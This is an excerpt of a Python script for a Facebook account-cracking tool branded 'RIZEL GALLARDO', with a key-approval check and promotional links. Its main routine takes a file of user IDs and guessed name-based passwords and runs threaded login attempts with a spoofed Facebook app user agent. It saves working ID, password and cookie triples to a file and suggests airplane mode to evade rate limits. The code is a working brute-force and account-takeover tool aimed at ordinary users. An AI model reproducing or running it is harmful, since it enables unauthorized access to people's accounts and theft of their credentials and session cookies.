...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mRIZEL GALLARDO\33[1;91m⊁ ')
...
def limon1():
        ua = "[FBAN/FB4A;FBAV/343.0.0.23.71;FBBV/537103720;FBRV/0;FBPN/com.facebook.katana;FBLC/pt_PT;FBMF/Realme;FBBD/Realme;FBDV/Realme 878;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
        return ua
#-----------------------------------------------------#
os.system('xdg-open https://www.facebook.com/profile.php?id=100093795632328&mibextid=kFxxJD ')
logo1 = f"""{W}
   \033[1;31m    /$$$$$$$  /$$$$$$ /$$$$$$$$ /$$$$$$$$ /$$      
   ...
   \033[1;31m   | $$  \ $$  | $$    /$$/    | $$      | $$      
   \033[1;34m   | $$  | $$ /$$$$$$ /$$$$$$$$| $$$$$$$$| $$$$$$$$
   \033[1;35m   |__/  |__/|______/|________/|________/|________/

\033[1;96m ⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅
  \033[1;33m[◉] OWNER     :   RIZEL GALLARDO
  \033[1;33m[◉] GITHUB    :   404
  \033[1;33m[◉] STATUS    :   TRIAL
  \033[1;33m[◉] FACEBOOK  :   RIZEL GALLARDO
  \033[1;33m[◉] VERSION   :   0.8
  \033[1;33m[◉] KEY       :   {MY_KEY}
\033[1;96m ⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅"""
line = f"{S} ⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅⑅"
...
class apvroval:
    def check():
        url = "https://github.com/Kitlovekids/approval_/blob/main/approved.txt"
        import mechanize
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                clear()
                print(f'{W} THIS TOOL IS FREE BUT YOU NEED GET APPROVED FIRST')
                os.system('xdg-open https://www.facebook.com/profile.php?id=100093795632328&mibextid=kFxxJD ')
...
class Main:
    def Awm():
        clear()
        print(f'{Y}  [1] FILE CLONING')
        print(f'  [2] FOLLOW FB')
        print(f'  [3] EXIT PROGRAM')
        linex()
        awm = input(f' SELECT OPTION :{G} ');linex()
        if awm in ['1']:Awm_File()
        elif awm in ['2']:os.system('xdg-open https://www.facebook.com/profile.php?id=100093795632328&mibextid=kFxxJD')
        elif awm in ['3']:sys.exit()
        else:Main.Awm()

def Awm_File():
    clear()
    file = input(f' PUT FILE PATH : ');linex()
    try:fo = open(file,'r').read().splitlines()
    except FileNotFoundError:Awm_File()
    limit = int(input(f' TOTAL PASSWORD LIMIT : '));linex()
    print(f'\033[1;97m [◉] EXAMPLE : first last, firtslast, first123\n')
    for z in range(limit):
      password.append(input(f' PASSWORD NO.{z+1} : '))
    ...
    with tred(max_workers=30) as My_Tanisha:
        tl = str(len(fo))
        clear()
        print(f" {Y} TOTAL ID FROM CRACK : {S} {tl}{W}")
        print(f" {Y} TOTAL OK ID SAVE IN : {G}/sdcard/RIZEL-ALIVE.txt{W}")
        print(f" {Y} TOTAL CP ID SAVE IN : {R}/sdcard/RIZEL-DEAD.txt{W}")
        print(f" {Y} USE AIRPLANE MODE FOR GOOD RESULT{G}");linex()
        for user in fo:
...
def Jawnx(ids):
    if len(ids)==15:
        ...
        elif ids[:6] in ['100089']           :hking = ' 2023'
        else:hking=''
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[RIZEL] {loop} {G}[ALIVE ➮ {len(oks)}]{G} {R}[DEAD ➮ {len(cps)}]{R}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\n{G} [RIZEL ALIVE] \n ┌─[UID]  ➮ {ids}\n ├─[PASS] ➮ {pas}\n ├─[LINK] ➮ https://www.facebook.com/{ids}\n └─[YEAR] ➮{Jawnx(ids)}')
                open('/sdcard/RIZEL-ALIVE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r\x1b[38;5;126m [RIZEL DEAD] {ids} | {pas}')
                open('/sdcard/RIZEL-DEAD.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
